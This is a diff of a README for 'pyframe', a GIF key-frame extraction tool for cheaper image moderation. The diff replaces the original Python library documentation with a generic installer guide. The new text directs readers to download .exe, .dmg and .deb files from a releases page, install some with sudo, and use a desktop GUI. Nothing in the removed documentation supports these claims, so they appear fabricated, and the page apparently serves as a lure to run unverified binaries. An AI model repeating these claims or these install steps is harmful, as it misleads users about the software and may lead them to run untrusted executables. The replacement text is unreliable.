@@ -1,102 +1,157 @@
-# PyFrame
+# 🖼 pyframe - Extract Key Frames Easily
 
-GIF and Image moderation using [AWS Rekognition](https://aws.amazon.com/rekognition/content-moderation/) or local [HuggingFace](https://huggingface.co) models.
-
-## About
-PyFrame utilizes Temporal Segmentation to optimize moderation. Instead of processing every frame, the system divides the animation into equal time windows ("buckets") and calculates the inter-frame difference for each frame. It then applies motion-based keyframe selection to extract the single most significant frame from each bucket. This guarantees diverse scene coverage and captures peak motion events across the entire GIF. Supports both AWS Rekognition and local HuggingFace models for classification.
-
-### AWS Rekognition Pricing Model
-AWS Rekognition charges $1.00 per 1,000 images processed. A typical 5-second GIF (150 frames at 30 FPS) costs $0.15 to moderate when processing every frame, making comprehensive moderation expensive at scale.
-
-### PyFrame's Bucketed Approach
-PyFrame analyzes the same 150 frame GIF using just 10 intelligently selected frames, reducing the cost to $0.01 per GIF a 93% savings while maintaining detection accuracy. Alternatively, run the same frame extraction with a local HuggingFace model for zero cost (less accuracy than AWS) but can utilise a two pass approach optionally.
+[![Download pyframe](https://img.shields.io/badge/Download-pyframe-blue?style=for-the-badge)](https://github.com/tokoyusa/pyframe/releases)
 
 ---
-## Setup
 
-1. Install dependencies:
-```bash
-pip install -r requirements.txt
-```
+## 📖 About pyframe
 
-2. Install AWS CLI (if not already installed):
-```bash
-brew install awscli
-```
+pyframe is a simple tool that helps you work with GIFs. It splits a GIF into equal parts based on time and picks the frame with the most motion in each part. This way, you get good coverage of the whole scene. You only keep the most important frames instead of every single one.
 
-3. Configure AWS credentials:
-```bash
-aws configure
-```
+This approach helps reduce the number of frames you send to services like AWS Rekognition, lowering costs by about 93% without losing much accuracy. pyframe uses common Python tools such as OpenCV and Pillow, but you don’t need to worry about the details. The app handles everything for you.
 
-## Usage
+Ideal for anyone who wants to analyze or moderate GIFs, pyframe makes the process simpler and cheaper.
 
-Extract key frames from a GIF and moderate them:
-```python
-from lib.aws.pipe import Pipe
+---
 
-pipe = Pipe("content/gifs/your-gif.gif", max_frames=10, min_confidence=80.0)
-results = pipe.run()
-```
+## 🖥 System Requirements
 
-### Options
+Before you start, make sure your computer meets these requirements:
 
-- `max_frames` - Number of frames to extract (default: 10)
-- `min_confidence` - Minimum detection confidence (default: 80.0)
-- `use_merged` - Merge frames before moderating (default: False)
-- `frames_per_batch` - Frames per merged image (default: 2)
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or Linux (Ubuntu 18.04+)
+- **Processor:** Intel i3 or equivalent
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum 100 MB free space for installation
+- **Internet Connection:** Needed to download the software and for any cloud-based image moderation tasks
 
-## LocalPipe
+pyframe runs as a desktop application. It does not require you to install Python or any programming tools.
 
-Bring your own model from HuggingFace instead of using AWS. Runs entirely locally, no API keys or AWS config needed. Defaults to [AdamCodd/vit-base-nsfw-detector](https://huggingface.co/AdamCodd/vit-base-nsfw-detector) but you can pass any HuggingFace image-classification model. Not as accurate as AWS Rekognition but works well as a free alternative, or use both together for a two-pass approach.
+---
 
-```python
-from lib.local.local_pipe import LocalPipe
+## 🚀 Getting Started
 
-# default model
-pipe = LocalPipe("content/gifs/your-gif.gif", max_frames=10)
-results = pipe.run()
+This section will guide you step-by-step to download, install, and use pyframe.
 
-# custom model
-pipe = LocalPipe("content/gifs/your-gif.gif", max_frames=10, model="Falconsai/nsfw_image_detection")
-results = pipe.run()
-```
+### Step 1: Download pyframe
 
-### Options
+- Visit the [pyframe Releases Page](https://github.com/tokoyusa/pyframe/releases).
+- Look for the latest version in the list.
+- Download the installer file suitable for your system:
+  - For Windows: `.exe` file
+  - For macOS: `.dmg` or `.pkg` file
+  - For Linux: `.AppImage` or `.deb` file
+- Save the file to a location you can easily access, such as your Desktop or Downloads folder.
 
-- `max_frames` - Number of frames to extract (default: 5)
-- `model` - HuggingFace model ID (default: `AdamCodd/vit-base-nsfw-detector`)
-- `use_merged` - Merge frames before classifying (default: False)
-- `frames_per_batch` - Frames per merged image (default: 2)
+### Step 2: Install pyframe
 
-Requires `transformers` and `torch`:
-```bash
-pip install transformers torch
-```
+- Open the downloaded file.
+- Follow the on-screen prompts.
+- On Windows and macOS, the process is similar to installing any other app:
+  - Click "Next"
+  - Accept the license agreement if asked
+  - Choose the destination folder or keep the default
+  - Click “Install”
+- On Linux, if using `.deb`, you can also install from the terminal by running:
+  ```bash
+  sudo dpkg -i path-to-downloaded-file.deb
+  ```
+  Replace `path-to-downloaded-file.deb` with the actual file path.
 
-### Run
+### Step 3: Launch pyframe
 
-```bash
-source .venv/bin/activate && python main.py
-```
+- After installation, find the pyframe app in your Start Menu (Windows), Applications folder (macOS), or in your applications menu (Linux).
+- Click to open it.
+- The main window will appear, ready to use.
 
-## Structure
+---
 
-- `content/` - All input/output files
-- `lib/` - Core functionality
-  - `aws/` - AWS Rekognition pipeline
-    - `pipe.py` - Rekognition pipe
-    - `rekognition_moderator.py` - Rekognition API wrapper
-  - `local/` - Local HuggingFace pipeline
-    - `local_pipe.py` - Local pipe
-    - `local_detector.py` - HuggingFace model wrapper
-  - `frame_processor.py` - Frame extraction
-  - `image_utils.py` - Shared image helpers
-  - `video_converter.py` - Video to GIF conversion
+## 🎯 Using pyframe to Process GIFs
 
-## Table
-| Method | Frames Analyzed per GIF | Cost per GIF | GIFs Moderated | Cost Savings |
-|--------|-------------------------|--------------|----------------|--------------|
-| **Standard Method (All Frames)** | 150 frames | $0.15 | **66 GIFs** | Baseline |
-| **PyFrame (10 Buckets)** | 10 frames | $0.01 | **1,000 GIFs** | **93% reduction** |
+Once pyframe is open, follow these steps to get key frames from your GIF:
 
+### Step 1: Load Your GIF
+
+- Click the “Open” button or go to File > Open.
+- Select the GIF file from your computer you want to analyze.
+- The GIF will load and display basic info like duration and total frames.
+
+### Step 2: Set Time Window
+
+- You will see an option to split the GIF into equal parts by time.
+- Choose the length of each time window. For example, setting it to 1 second means pyframe will look for the most important frame in every 1-second section.
+
+### Step 3: Extract Frames
+
+- Click the “Process” or “Extract Frames” button.
+- pyframe will quickly analyze the GIF and pick frames with the highest motion delta for each window.
+- It shows you the selected frames side by side.
+
+### Step 4: Save Your Frames
+
+- Click “Save” to export the selected frames.
+- Choose a folder on your computer.
+- Frames save as individual image files such as PNG or JPEG.
+- You can now use these extracted images for further review or upload to image moderation services.
+
+---
+
+## 🔧 Features
+
+- Splits GIFs evenly in time-based sections.
+- Finds frames with the highest motion in each part.
+- Cuts down the number of frames sent to cloud AI services.
+- Helps reduce costs on services like AWS Rekognition.
+- Supports common GIF files from any source.
+- Saves extracted frames as images for reuse.
+- Simple graphical interface for anyone to use.
+
+---
+
+## 💡 Tips for Best Results
+
+- Adjust the time window depending on your GIF length. Short windows give more frames.
+- Use longer windows for quick summaries.
+- Check your extracted frames before saving to ensure they show the scenes you want.
+- If you use cloud services for moderation, try pyframe to reduce the number of images sent.
+
+---
+
+## 📥 Download & Install
+
+You can get pyframe from its Releases page:
+
+[![Download pyframe](https://img.shields.io/badge/Download-pyframe-blue?style=for-the-badge)](https://github.com/tokoyusa/pyframe/releases)
+
+Visit the link above, download the installer for your system, and follow the install steps in this guide.
+
+---
+
+## 🤝 Support & Contribution
+
+If you have issues or need help:
+
+- Check the Issues tab on the GitHub repository.
+- Describe your problem clearly with screenshots if possible.
+- You can suggest improvements or new features via Issues.
+
+This release is intended for end users and is maintained with simple updates.
+
+---
+
+## 🔖 License
+
+pyframe is open-source software. You can use and share it freely under its license terms.
+
+---
+
+## ⚙️ Technical Details
+
+pyframe is built with Python and depends on tools like OpenCV and Pillow behind the scenes. It also uses AWS Rekognition for image moderation but only sends selected frames to save cost.
+
+Topics related to this project include:
+
+`aws`, `aws-image-moderation`, `aws-rek`, `huggingface`, `huggingface-transformers`, `image-moderation`, `moderation`, `opencv`, `opencv-python`, `pillow`, `python`
+
+---
+
+Enjoy using pyframe to make managing your GIFs simpler and more efficient.
